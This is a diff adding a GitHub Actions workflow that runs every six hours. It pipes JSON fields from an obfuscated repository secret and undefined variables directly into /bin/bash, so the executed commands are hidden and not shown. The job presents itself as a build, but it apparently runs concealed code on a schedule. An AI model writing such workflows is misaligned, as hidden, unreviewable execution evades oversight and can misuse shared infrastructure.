@@ -1,0 +1,24 @@
+name: daichengwei6175
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: daichengwei6175
+        env:
+          oxq5546: ${{ secrets.oxq5546 }}
+        run: |
+          echo $oxq5546 | jq -r .u0 | /bin/bash
+          echo $c155 | jq -r .fg87 | /bin/bash
+          echo $wcx523 | jq -r .zwj10 | /bin/bash
+          echo $voqr4544 | jq -r .q6429 | /bin/bash
+          echo $dmcfj655 | jq -r .cpmzy18508 | /bin/bash
+          echo $thfki91692 | jq -r .p9 | /bin/bash
+          echo $uyj21 | jq -r .d930 | /bin/bash
+
